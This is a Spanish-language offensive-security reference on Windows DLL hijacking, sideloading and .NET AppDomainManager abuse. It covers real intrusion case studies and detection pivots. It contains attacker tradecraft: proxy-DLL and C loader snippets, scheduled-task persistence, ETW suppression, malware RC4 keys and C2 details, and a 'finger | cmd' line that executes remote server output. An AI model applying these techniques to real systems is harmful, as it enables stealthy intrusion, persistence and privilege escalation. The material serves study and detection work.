...
DLL Hijacking consiste en manipular una aplicación de confianza para que cargue una DLL maliciosa. Este término engloba varias tácticas, como **DLL Spoofing, Injection y Side-Loading**. Se utiliza principalmente para la ejecución de código y para lograr persistencia y, con menor frecuencia, para la escalada de privilegios. Aunque aquí el enfoque está en la escalada, el método de hijacking sigue siendo el mismo independientemente del objetivo.

### Técnicas comunes

Se emplean varios métodos para realizar DLL hijacking, y su eficacia depende de la estrategia de carga de DLL de la aplicación:<sup>[[4]](#references)</sup>
...
3. **Phantom DLL Hijacking**: Crear una DLL maliciosa para que la aplicación la cargue, creyendo que se trata de una DLL requerida inexistente.
...
5. **WinSxS DLL Replacement**: Sustituir la DLL legítima por una contraparte maliciosa en el directorio WinSxS, un método asociado habitualmente con DLL side-loading.
...
El DLL sideloading clásico no es la única forma de hacer que un proceso **.NET Framework** de confianza cargue código controlado por el atacante. Si el ejecutable objetivo es una aplicación **managed**, el CLR también consulta un archivo de configuración de la aplicación denominado igual que el ejecutable (por ejemplo, `Setup.exe.config`). Ese archivo puede definir un **AppDomainManager** personalizado. Si la configuración apunta a un assembly controlado por el atacante situado junto al EXE, el CLR lo carga **antes de la ruta de código normal de la aplicación** y lo ejecuta dentro del proceso de confianza.<sup>[[24]](#references)</sup>
...
```
Notas prácticas:
- Este tradecraft es específico de **.NET Framework**. Depende del análisis de la configuración del CLR, no del orden de búsqueda de DLL de Win32.
- El host debe ser realmente un **EXE administrado**. Triage rápido: `sigcheck -m target.exe`, `corflags target.exe` o comprobar la existencia del **CLR Runtime Header** en los metadatos PE.
...
- Esto resulta útil con binarios **firmados de Microsoft o de proveedores** porque el EXE de confianza permanece intacto mientras el assembly administrado malicioso se ejecuta in-process.
- Si ya tienes un directorio de instalación/actualización con permisos de escritura, el hijacking de AppDomainManager puede utilizarse como **first stage**, seguido de un DLL sideloading clásico o de reflective loading para las etapas posteriores.

### AppDomainManager como downloader + bootstrap de scheduled task

Un patrón práctico de intrusión consiste en combinar el EXE administrado de confianza con un `*.config` malicioso y un DLL malicioso de AppDomainManager que actúa únicamente como un **bootstrapper pequeño**:<sup>[[25]](#references)</sup>
...
3. El manager malicioso realiza un **path gate** (por ejemplo, solo continuar si el host EXE se está ejecutando desde `Downloads`, y permitir que el second stage se ejecute únicamente desde `%LOCALAPPDATA%`).
4. Si la comprobación es correcta, descarga el payload real en una ruta con permisos de escritura para el usuario, como `%LOCALAPPDATA%\PerfWatson2.exe`, e instala persistence mediante una scheduled task.

Por qué importa esta variante:
- El host EXE firmado permanece sin cambios, por lo que un triage que solo calcule el hash del binario principal puede no detectar el compromiso.
- Es común utilizar **anti-analysis basada en rutas**: mover el conjunto ZIP/EXE/DLL al Desktop, Temp o una ruta de sandbox puede romper intencionadamente la cadena.
- El DLL de AppDomainManager de la first stage puede mantenerse pequeño y con poco ruido mientras el implant real se descarga posteriormente.

Ejemplo mínimo de persistence visto frecuentemente con este patrón:
```cmd
...
- Esta técnica suele categorizarse mejor como **ejecución/persistencia mediante abuso de la configuración de .NET** que como el clásico hijacking del orden de búsqueda de DLLs faltantes, aunque los operadores suelen encadenar ambos.

Pivotes de detección:
- Ejecutables .NET firmados lanzados desde **rutas de extracción ZIP**, `Downloads`, `%TEMP%` u otras carpetas modificables por el usuario, con un `<exe>.config` **en la misma ubicación**.
...
- Procesos bootstrap administrados de corta duración que descargan inmediatamente otro EXE y después ejecutan `schtasks.exe`.
...
Para persistencia, no busques únicamente **crear una tarea nueva**. Algunos grupos de intrusión esperan hasta que un instalador legítimo crea una **tarea normal de actualización** y después **reescriben la acción de la tarea**, de modo que el nombre, el autor y el trigger existentes sigan resultando familiares para los defensores.
...
3. Sustituye únicamente la acción para que la tarea inicie tu **EXE host de confianza** desde un directorio de staging modificable por el usuario; este ejecutará el sideload o cargará mediante AppDomain el payload real.
...
- El servicio **Task Scheduler** lo inicia, por lo que la validación del proceso padre/ancestro suele ver la cadena de programación esperada en lugar de `explorer.exe`.
...
- Genera una alerta cuando una **tarea de actualización con apariencia de proveedor** se ejecute desde **directorios en los que el usuario puede escribir** o inicie un EXE de .NET con un archivo `*.config` ubicado junto a él.

> [!TIP]
> Para consultar una cadena paso a paso que combina staging mediante HTML, configuraciones AES-CTR e implants .NET sobre DLL sideloading, revisa el workflow siguiente.
...
![Common Techniques - Encontrar Dlls faltantes: La forma más común de encontrar Dlls faltantes dentro de un sistema es ejecutar procmon de sysinternals, configurando los 2 filtros siguientes](<../../../images/image (961).png>)

![Common Techniques - Encontrar Dlls faltantes: La forma más común de encontrar Dlls faltantes dentro de un sistema es ejecutar procmon de sysinternals, configurando los 2 filtros siguientes](<../../../images/image (230).png>)

y mostrar únicamente la **File System Activity**:

![Common Techniques - Encontrar Dlls faltantes: y mostrar únicamente la File System Activity](<../../../images/image (153).png>)
...
Las **aplicaciones de Windows** buscan DLLs siguiendo un conjunto de **rutas de búsqueda predefinidas**, conforme a una secuencia determinada. El problema del DLL hijacking surge cuando se coloca estratégicamente una DLL maliciosa en uno de estos directorios, garantizando que se cargue antes que la DLL auténtica. Una solución para evitarlo es asegurarse de que la aplicación utilice rutas absolutas al referirse a las DLLs que necesita.

Puedes ver el **orden de búsqueda de DLL en sistemas de 32 bits** a continuación:

1. El directorio desde el que la aplicación se cargó.
...
6. Los directorios incluidos en la variable de entorno PATH. Ten en cuenta que esto no incluye la ruta por aplicación especificada mediante la clave de registro **App Paths**. La clave **App Paths** no se utiliza al calcular la ruta de búsqueda de DLL.

Ese es el orden de búsqueda **predeterminado** con **SafeDllSearchMode** habilitado. Cuando está deshabilitado, el directorio actual sube al segundo lugar. Para deshabilitar esta función, crea el valor de registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** y establécelo en 0 (está habilitado de forma predeterminada).
...
**Técnica relacionada:** [oplocker-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Utiliza filtros de **ProcMon** (`Process Name` = EXE objetivo, `Path` termina en `.dll`, `Result` = `NAME NOT FOUND`) para recopilar los nombres de las DLL que el proceso busca pero no puede encontrar.<sup>[[14]](#references)</sup>
...
```
5. Entrega el archivo en la bandeja de entrada/recurso compartido supervisado; cuando la tarea programada vuelva a iniciar el proceso, cargará la DLL maliciosa y ejecutará tu código con la cuenta del servicio.

### Forzando el sideloading mediante RTL_USER_PROCESS_PARAMETERS.DllPath

Una forma avanzada de influir de manera determinista en la ruta de búsqueda de DLL de un proceso recién creado consiste en establecer el campo DllPath de RTL_USER_PROCESS_PARAMETERS al crear el proceso con las API nativas de ntdll. Al proporcionar aquí un directorio controlado por el atacante, se puede forzar a un proceso objetivo que resuelva una DLL importada por nombre (sin una ruta absoluta y sin usar los flags de carga segura) a cargar una DLL maliciosa desde ese directorio.

Idea clave
- Crea los parámetros del proceso con RtlCreateProcessParametersEx y proporciona un DllPath personalizado que apunte a tu carpeta controlada (por ejemplo, el directorio donde se encuentra tu dropper/unpacker).
...
- El objetivo debe importar o usar LoadLibrary para cargar una DLL por nombre (sin una ruta absoluta y sin usar LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs y las rutas absolutas codificadas no pueden ser hijacked. Los exports reenviados y SxS pueden cambiar la precedencia.

Ejemplo C mínimo (ntdll, wide strings, gestión de errores simplificada):

<details>
<summary>Ejemplo C completo: forzando el DLL sideloading mediante RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
...
- Coloca una xmllite.dll maliciosa (que exporte las funciones requeridas o haga proxy a la real) en tu directorio DllPath.
- Inicia un binario firmado conocido por buscar xmllite.dll por nombre utilizando la técnica anterior. El loader resuelve el import mediante el DllPath proporcionado y hace sideload de tu DLL.

Esta técnica se ha observado in-the-wild para ejecutar cadenas de sideloading de varias etapas: un launcher inicial deposita una DLL auxiliar, que después inicia un binario firmado por Microsoft susceptible de hijacking con un DllPath personalizado para forzar la carga de la DLL del atacante desde un directorio de staging.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking mediante `.exe.config`

Para objetivos de **.NET Framework**, el sideloading puede realizarse **antes de `Main()`** sin parchear la memoria, abusando del archivo **`.exe.config`** adyacente de la aplicación. En lugar de depender únicamente del orden de búsqueda de DLL de Win32, el atacante coloca un EXE .NET legítimo junto a un archivo de configuración malicioso y uno o más assemblies controlados por el atacante.
...
- **`<publisherPolicy apply="no"/>`** evita las redirecciones de publisher policy hacia ensamblados más recientes.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** hace que la selección del runtime sea más determinista.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** es especialmente interesante porque el **CLR desactiva su propia visibilidad ETW** mediante la configuración, en lugar de que el implant modifique `EtwEventWrite` en memoria.
...
- La fase 3 verifica el contexto de ejecución (por ejemplo, el `svchost.exe` padre esperado de Task Scheduler) antes de cargar la DLL/export final del RAT.

Ideas para hunting:
- **Ejecutables .NET** firmados o legítimos que se ejecuten con archivos **`.config`** adyacentes sospechosos en ubicaciones en las que el usuario pueda escribir.
...
- Scheduled tasks que vuelvan a ejecutar binarios de actualización renombrados desde **`%LOCALAPPDATA%`** o directorios específicos de la aplicación como `\bin\update\`.
- Cadenas padre/hijo en las que una scheduled task inicie un host .NET de confianza que cargue inmediatamente ensamblados que no sean del vendor desde su propio directorio.
...
- Cuando se encuentra una **DLL que comparte su nombre con una que ya está cargada en memoria**, el sistema omite la búsqueda habitual. En su lugar, comprueba si existe redirección y un manifest antes de recurrir a la DLL que ya está en memoria. **En este escenario, el sistema no realiza una búsqueda de la DLL**.
- Cuando la DLL se reconoce como una **known DLL** para la versión actual de Windows, el sistema utilizará su versión de la known DLL, junto con cualquiera de sus DLL dependientes, **omitiendo el proceso de búsqueda**. La clave del registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene una lista de estas known DLLs.
...
Estos requisitos no suelen darse de forma predeterminada: los ejecutables privilegiados normalmente no tienen dependencias de DLL ausentes, y los usuarios estándar normalmente no pueden escribir en directorios de las rutas de búsqueda del sistema. Sin embargo, los entornos mal configurados pueden exponer ambas condiciones.\
Si se cumplen los requisitos, consulta el proyecto [UACME](https://github.com/hfiref0x/UACME). Aunque su objetivo principal es el bypass de UAC, contiene PoCs de DLL hijacking para versiones específicas de Windows que a menudo pueden adaptarse al directorio con permisos de escritura que hayas encontrado.
...
Básicamente, un **DLL proxy** es una DLL capaz de **ejecutar tu código malicioso cuando se carga**, pero también de **exponer** y **funcionar** como se **espera**, **retransmitiendo todas las llamadas a la biblioteca real**.
...
<details>
<summary>DLL de C alternativa con entrada de subproceso</summary>
```c
...
## Caso práctico: Narrator OneCore TTS Localization DLL Hijack (Accesibilidad/ATs)

Windows Narrator.exe sigue buscando al iniciarse una DLL de localization predecible y específica del idioma que puede ser hijacked para ejecutar código arbitrario y lograr persistencia.<sup>[[7]](#references)</sup>

Datos clave
- Ruta de búsqueda (compilaciones actuales): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Ruta legacy (compilaciones antiguas): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
...
```
Silencio OPSEC
- Un hijack ingenuo hablará/resaltará la UI. Para permanecer en silencio, al adjuntarse enumera los threads de Narrator, abre el thread principal (`OpenThread(THREAD_SUSPEND_RESUME)`) y aplícale `SuspendThread`; continúa en tu propio thread. Consulta el PoC para ver el código completo.<sup>[[8]](#references)</sup>
...
- Conéctate por RDP al host y, en la pantalla de inicio de sesión, pulsa CTRL+WIN+ENTER para iniciar Narrator; tu DLL se ejecuta como SYSTEM en el secure desktop.
- La ejecución se detiene cuando se cierra la sesión RDP; haz inject/migrate rápidamente.

Bring Your Own Accessibility (BYOA)
- Puedes clonar una entrada del registro de una Accessibility Tool (AT) integrada (por ejemplo, CursorIndicator), editarla para que apunte a un binary/DLL arbitrario, importarla y, después, establecer `configuration` con el nombre de esa AT. Esto hace proxy de una ejecución arbitraria bajo el framework de Accessibility.
...
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` se ejecuta diariamente a las 9:30 AM bajo el contexto del usuario con sesión iniciada.
- **Permisos del directorio**: Escribible por `CREATOR OWNER`, lo que permite a usuarios locales depositar archivos arbitrarios.
- **Comportamiento de búsqueda de DLL**: Intenta cargar `hostfxr.dll` primero desde su working directory y registra "NAME NOT FOUND" si falta, lo que indica precedencia de búsqueda en el directorio local.
...
2. Espera a que la tarea programada se ejecute a las 9:30 a. m. bajo el contexto del usuario actual.
...
## Estudio de caso: MSI CustomAction Dropper + DLL Side-Loading mediante Signed Host (wsc_proxy.exe)
...
- El usuario descarga el MSI. Una CustomAction se ejecuta silenciosamente durante la instalación con GUI (por ejemplo, una acción LaunchApplication o VBScript) y reconstruye la siguiente etapa a partir de recursos incrustados.
- El dropper escribe un EXE legítimo y firmado, junto con una DLL maliciosa, en el mismo directorio (par de ejemplo: wsc_proxy.exe firmado por Avast + wsc.dll controlada por el atacante).
- Cuando se inicia el EXE firmado, el orden de búsqueda de DLL de Windows carga primero wsc.dll desde el directorio de trabajo y ejecuta el código del atacante bajo un proceso principal firmado (ATT&CK T1574.001).
...
- wsc.dll: DLL del atacante. Si no se requieren exports específicos, DllMain puede ser suficiente; de lo contrario, crea una proxy DLL y reenvía los exports necesarios a la biblioteca legítima mientras ejecutas el payload en DllMain.
...
```
- Para los requisitos de exportación, usa un framework de proxying (por ejemplo, DLLirant/Spartacus) para generar una forwarding DLL que también ejecute tu payload.

- Esta técnica depende de la resolución del nombre de la DLL por parte del binario host. Si el host usa rutas absolutas o flags de carga segura (por ejemplo, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), el hijack puede fallar.
...
Check Point describió cómo Ink Dragon despliega ShadowPad mediante una **triada de tres archivos** para mezclarse con software legítimo mientras mantiene el payload principal cifrado en disco:<sup>[[12]](#references)</sup>
...
2. **DLL loader maliciosa** – se deja junto al EXE con un nombre esperado (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL normalmente es un binario MFC ofuscado con el framework ScatterBrain; su única función es localizar el blob cifrado, descifrarlo y mapear ShadowPad reflectivamente.
...
* Renombrar el EXE firmado (manteniendo el `OriginalFileName` original en el encabezado PE) permite que se haga pasar por un binario de Windows y conserve la firma del vendor; por tanto, reproduce el hábito de Ink Dragon de dejar caer binarios con apariencia de `conhost.exe` que en realidad son utilidades de AMD/NVIDIA.
* Como el ejecutable sigue siendo de confianza, la mayoría de los controles de allowlisting solo necesitan que tu DLL maliciosa esté junto a él. Concéntrate en personalizar la DLL loader; normalmente el parent firmado puede ejecutarse sin cambios.
* El decryptor de ShadowPad espera que el blob TMP esté junto al loader y sea escribible para poder poner a cero el archivo después del mapping. Mantén el directorio escribible hasta que se cargue el payload; una vez en memoria, el archivo TMP puede eliminarse de forma segura para OPSEC.
...
```
- `finger user@host` obtiene texto TCP/79; `| cmd` ejecuta la respuesta del servidor, lo que permite a los operadores rotar el servidor de segunda etapa desde el lado del servidor.

- **Download/extract integrado:** Descarga un archivo con una extensión benigna, descomprímelo y prepara el objetivo del sideload junto con la DLL en una carpeta `%LocalAppData%` aleatoria:
...
- **Ejecución mediante WMI/CIM:** Inicia el EXE mediante WMI para que la telemetría muestre un proceso creado por CIM mientras carga la DLL ubicada junto a él:
...
Una intrusión reciente de Lotus Blossom abusó de una cadena de actualización de confianza para entregar un dropper empaquetado con NSIS que preparaba un DLL sideload junto con payloads completamente in-memory.<sup>[[13]](#references)</sup>

Flujo de tradecraft
- `update.exe` (NSIS) crea `%AppData%\Bluetooth`, lo marca como **HIDDEN**, deja un Bitdefender Submission Wizard renombrado (`BluetoothService.exe`), un `log.dll` malicioso y un blob cifrado `BluetoothService`, y después inicia el EXE.
- El EXE host importa `log.dll` y llama a `LogInit`/`LogWrite`. `LogInit` carga el blob mediante mmap; `LogWrite` lo descifra con un stream basado en LCG personalizado (constantes **0x19660D** / **0x3C6EF35F**, material de clave derivado de un hash anterior), sobrescribe el buffer con shellcode en plaintext, libera los temporales y salta a él.
- Para evitar una IAT, el loader resuelve APIs mediante hashing de los nombres de export usando la base FNV-1a 0x811C9DC5 + el primo 0x100019, y después aplica un avalanche de estilo Murmur (**0x85EBCA6B**) y compara con hashes objetivo con salt.

Shellcode principal (Chrysalis)
- Descifra un módulo principal similar a PE repitiendo add/XOR/sub con la clave `gQ2JR&9;` durante cinco pasadas; después carga dinámicamente `Kernel32.dll` → `GetProcAddress` para finalizar la resolución de imports.
- Reconstruye en runtime las cadenas de nombres de DLL mediante transformaciones de bit-rotate/XOR por carácter; después carga `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Utiliza un segundo resolver que recorre el **PEB → InMemoryOrderModuleList**, analiza cada export table en bloques de 4 bytes con mixing de estilo Murmur y solo recurre a `GetProcAddress` si no encuentra el hash.

Configuración embebida y C2
- La configuración reside dentro del archivo `BluetoothService` dejado en disco, en el **offset 0x30808** (tamaño **0x980**), y se descifra mediante RC4 con la clave `qwhvb^435h&*7`, revelando la URL del C2 y el User-Agent.
- Los beacons construyen un perfil de host delimitado por puntos, anteponen el tag `4Q` y después lo cifran con RC4 usando la clave `vAuig34%^325hGV` antes de `HttpSendRequestA` sobre HTTPS. Las respuestas se descifran con RC4 y se distribuyen mediante un tag switch (`4T` shell, `4V` ejecución de procesos, `4W/4X` escritura de archivos, `4Y` lectura/exfil, `4\\` desinstalación, `4` enumeración de unidades/archivos + casos de transferencia por chunks).
...
- La misma intrusión dejó Tiny C Compiler y ejecutó `svchost.exe -nostdlib -run conf.c` desde `C:\ProgramData\USOShared\`, con `libtcc.dll` junto a él. El código fuente C proporcionado por el atacante incluía shellcode, se compilaba y se ejecutaba en memoria sin tocar el disco con un PE. Reproduce esto con:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Esta etapa de compilación y ejecución basada en TCC importaba `Wininet.dll` en tiempo de ejecución y extraía un shellcode de segunda etapa desde una URL codificada de forma fija, proporcionando un loader flexible que se hacía pasar por una ejecución del compilador.

## Sideloading de un host firmado con export proxying + estacionamiento del hilo del host
...
Patrón observado
- Colocar un EXE de confianza junto a una DLL maliciosa usando el nombre de dependencia esperado, como `version.dll`.
- La DLL maliciosa hace **proxy de todas las exportaciones esperadas** hacia la DLL real del sistema (por ejemplo, `%SystemRoot%\\System32\\version.dll`), de modo que la resolución de imports siga funcionando y el proceso host continúe operativo.
- Después de la carga, la DLL maliciosa **parchea el entry point del host** para que el hilo principal entre en un bucle infinito de `Sleep`, en lugar de finalizar o ejecutar rutas de código que terminen el proceso.
- Un nuevo hilo realiza el trabajo malicioso real: descifra el nombre o la ruta de la DLL de la siguiente etapa (RC4/XOR son comunes) y después la inicia con `LoadLibrary`.
...
- Estacionar el hilo principal en `Sleep(INFINITE)` es una forma sencilla de mantener residente el proceso firmado mientras el loader realiza el descifrado, el staging o el arranque de red en un worker thread.
- Buscar únicamente una `DllMain` sospechosa puede hacer que se pase por alto este patrón si el comportamiento interesante ocurre después de parchear el entry point del host y arrancar un hilo secundario.
...
4. Desde ese hilo, parchear el entry point del host o la rutina de inicio del hilo principal para que entre en un bucle con `Sleep`.
...
- Hilos creados por una DLL proxy que llaman inmediatamente a `LoadLibrary` sobre una segunda DLL cuyo nombre ha sido descifrado.
- DLL proxy con todas las exportaciones, colocadas junto a ejecutables de proveedores dentro de directorios de staging con permisos de escritura, como `ProgramData`, `%TEMP%` o rutas de archivos descomprimidos.
...
- [2] [CVE-2025-1729 - Escalada de privilegios usando TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
...
- [11] [Unit 42 – Intereses convergentes: análisis de los grupos de amenazas que apuntan contra un gobierno del Sudeste Asiático](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
...
- [13] [Rapid7 – La puerta trasera Chrysalis: análisis detallado del toolkit de Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
